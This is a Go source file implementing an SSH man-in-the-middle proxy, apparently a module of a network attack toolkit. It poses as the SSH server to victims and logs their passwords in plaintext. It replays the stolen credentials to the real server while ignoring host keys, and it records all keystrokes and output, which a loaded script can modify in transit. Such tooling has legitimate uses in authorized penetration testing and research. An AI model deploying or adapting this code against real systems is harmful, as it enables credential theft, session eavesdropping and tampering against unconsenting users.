package ssh_proxy

import (
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// handleConnection performs the full SSH MITM:
//  1. Accept an SSH handshake from the client (proxy acts as server)
//  2. Determine the real destination (static config or NAT lookup)
//  3. Dial the real SSH server, replaying the client's credentials
//  4. Bridge all channels and requests between client ↔ server, logging plaintext
func (mod *SSHProxy) handleConnection(tcpConn net.Conn) {
	defer tcpConn.Close()

	clientAddr := tcpConn.RemoteAddr().String()
	mod.Info("[%s] new TCP connection", clientAddr)

	// --- 1. Server-side SSH handshake with the client ---
	serverConn, chans, reqs, err := ssh.NewServerConn(tcpConn, mod.serverConf)
	if err != nil {
		mod.Warning("[%s] SSH handshake failed: %v", clientAddr, err)
		return
	}
	defer serverConn.Close()

	user := serverConn.User()
	mod.Info("[%s] SSH handshake complete: user=%s client_version=%s",
		clientAddr, user, string(serverConn.ClientVersion()))

	// --- 2. Determine the real destination ---
	destAddr, err := mod.resolveDestination(tcpConn)
	if err != nil {
		mod.Error("[%s] cannot resolve destination: %v", clientAddr, err)
		return
	}

	// Safety: if destination resolves to ourselves, don't create a loop
	proxyAddr := mod.listener.Addr().String()
	if destHost, destPort, _ := net.SplitHostPort(destAddr); destHost != "" {
		if proxyHost, _, _ := net.SplitHostPort(proxyAddr); proxyHost != "" {
			if destHost == proxyHost && destPort == fmt.Sprintf("%d", mod.sshPort) {
				mod.Warning("[%s] destination %s is the proxy machine itself, skipping to avoid loop", clientAddr, destAddr)
				return
			}
		}
	}

	mod.Info("[%s] forwarding to %s", clientAddr, destAddr)

	// --- 3. Dial upstream SSH server, replaying credentials ---
	upstreamConf := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Replay password if we captured one
	if serverConn.Permissions != nil && serverConn.Permissions.Extensions != nil {
		if pass, ok := serverConn.Permissions.Extensions["password"]; ok {
			mod.Info("[%s] >>> CAPTURED PASSWORD: user=%s password=%s",
				clientAddr, user, pass)
			upstreamConf.Auth = []ssh.AuthMethod{
				ssh.Password(pass),
			}
		}
	}

	upstreamTCP, err := net.DialTimeout("tcp", destAddr, 10*time.Second)
	if err != nil {
		mod.Error("[%s] failed to connect to upstream %s: %v", clientAddr, destAddr, err)
		return
	}
	defer upstreamTCP.Close()

	upstreamConn, upstreamChans, upstreamReqs, err := ssh.NewClientConn(upstreamTCP, destAddr, upstreamConf)
	if err != nil {
		mod.Error("[%s] upstream SSH handshake failed at %s: %v", clientAddr, destAddr, err)
		return
	}
	defer upstreamConn.Close()

	mod.Info("[%s] upstream connected: server_version=%s",
		clientAddr, string(upstreamConn.ServerVersion()))

	// --- 4. Bridge everything ---
	sessionID := fmt.Sprintf("%s->%s", clientAddr, destAddr)

	var wg sync.WaitGroup
	wg.Add(4)

	// Forward global requests both directions
	go func() {
		defer wg.Done()
		mod.forwardGlobalRequests(sessionID, "client->server", reqs, upstreamConn)
	}()
	go func() {
		defer wg.Done()
		mod.forwardGlobalRequests(sessionID, "server->client", upstreamReqs, serverConn.Conn)
	}()

	// Forward channels: client-opened channels → upstream
	go func() {
		defer wg.Done()
		mod.forwardChannels(sessionID, "client->server", chans, upstreamConn, serverConn.Conn)
	}()

	// Forward channels: upstream-opened channels → client
	go func() {
		defer wg.Done()
		mod.forwardChannels(sessionID, "server->client", upstreamChans, serverConn.Conn, upstreamConn)
	}()

	wg.Wait()
	mod.Info("[%s] session closed", sessionID)
}

// resolveDestination determines the real SSH server address.
func (mod *SSHProxy) resolveDestination(conn net.Conn) (string, error) {
	// If a static address was configured, use it
	if mod.address != "" {
		return fmt.Sprintf("%s:%d", mod.address, mod.sshPort), nil
	}

	// Try to get the original destination from the NAT table
	origDst, err := getOriginalDst(conn)
	if err != nil {
		return "", fmt.Errorf("no static ssh.address set and NAT lookup failed: %v", err)
	}
	return origDst, nil
}

// forwardGlobalRequests forwards out-of-band global requests (e.g. keepalive).
func (mod *SSHProxy) forwardGlobalRequests(sessionID, direction string, reqs <-chan *ssh.Request, dst ssh.Conn) {
	for req := range reqs {
		mod.Debug("[%s] global request %s: type=%s wantReply=%v len=%d",
			sessionID, direction, req.Type, req.WantReply, len(req.Payload))

		ok, payload, err := dst.SendRequest(req.Type, req.WantReply, req.Payload)
		if err != nil {
			mod.Debug("[%s] error forwarding global request %s: %v", sessionID, req.Type, err)
			if req.WantReply {
				req.Reply(false, nil)
			}
			continue
		}
		if req.WantReply {
			req.Reply(ok, payload)
		}
	}
}

// forwardChannels accepts new channels from one side and opens them on the other.
func (mod *SSHProxy) forwardChannels(sessionID, direction string, newChans <-chan ssh.NewChannel, dst ssh.Conn, src ssh.Conn) {
	for newCh := range newChans {
		chType := newCh.ChannelType()
		extraData := newCh.ExtraData()

		mod.Info("[%s] new channel %s: type=%s", sessionID, direction, chType)

		// Open the corresponding channel on the other side
		dstCh, dstReqs, err := dst.OpenChannel(chType, extraData)
		if err != nil {
			mod.Warning("[%s] failed to open %s channel upstream: %v", sessionID, chType, err)
			if openErr, ok := err.(*ssh.OpenChannelError); ok {
				newCh.Reject(openErr.Reason, openErr.Message)
			} else {
				newCh.Reject(ssh.ConnectionFailed, err.Error())
			}
			continue
		}

		srcCh, srcReqs, err := newCh.Accept()
		if err != nil {
			mod.Warning("[%s] failed to accept channel: %v", sessionID, err)
			dstCh.Close()
			continue
		}

		channelID := fmt.Sprintf("%s[%s]", sessionID, chType)

		// Bridge the channel data and requests
		var chWg sync.WaitGroup
		chWg.Add(4)

		// Data: src → dst (client→server for "session" = keystrokes)
		go func() {
			defer chWg.Done()
			mod.bridgeChannelData(channelID, direction, srcCh, dstCh)
		}()

		// Data: dst → src (server→client for "session" = output)
		reverseDir := reverseDirection(direction)
		go func() {
			defer chWg.Done()
			mod.bridgeChannelData(channelID, reverseDir, dstCh, srcCh)
		}()

		// Channel requests: src side
		go func() {
			defer chWg.Done()
			mod.bridgeChannelRequests(channelID, direction, srcReqs, dstCh)
		}()

		// Channel requests: dst side
		go func() {
			defer chWg.Done()
			mod.bridgeChannelRequests(channelID, reverseDir, dstReqs, srcCh)
		}()

		go func() {
			chWg.Wait()
			srcCh.Close()
			dstCh.Close()
		}()
	}
}

// bridgeChannelData copies data from src to dst, logging it.
func (mod *SSHProxy) bridgeChannelData(channelID, direction string, src io.Reader, dst io.WriteCloser) {
	buf := make([]byte, 32*1024)
	for {
		n, err := src.Read(buf)
		if n > 0 {
			data := buf[:n]

			// Log the plaintext
			mod.logData(channelID, direction, data)

			// Invoke JS script if loaded
			if mod.script != nil {
				if modified := mod.script.OnData(channelID, direction, data); modified != nil {
					data = modified
				}
			}

			if _, werr := dst.Write(data); werr != nil {
				mod.Debug("[%s] %s write error: %v", channelID, direction, werr)
				return
			}
		}
		if err != nil {
			if err != io.EOF {
				mod.Debug("[%s] %s read error: %v", channelID, direction, err)
			}
			return
		}
	}
}

// bridgeChannelRequests forwards channel-specific requests (pty-req, shell, exec, env, etc.)
func (mod *SSHProxy) bridgeChannelRequests(channelID, direction string, reqs <-chan *ssh.Request, dst ssh.Channel) {
	for req := range reqs {
		mod.logRequest(channelID, direction, req)

		ok, err := dst.SendRequest(req.Type, req.WantReply, req.Payload)
		if err != nil {
			mod.Debug("[%s] error forwarding channel request %s %s: %v",
				channelID, direction, req.Type, err)
			if req.WantReply {
				req.Reply(false, nil)
			}
			continue
		}
		if req.WantReply {
			req.Reply(ok, nil)
		}
	}
}

func reverseDirection(dir string) string {
	if dir == "client->server" {
		return "server->client"
	}
	return "client->server"
}
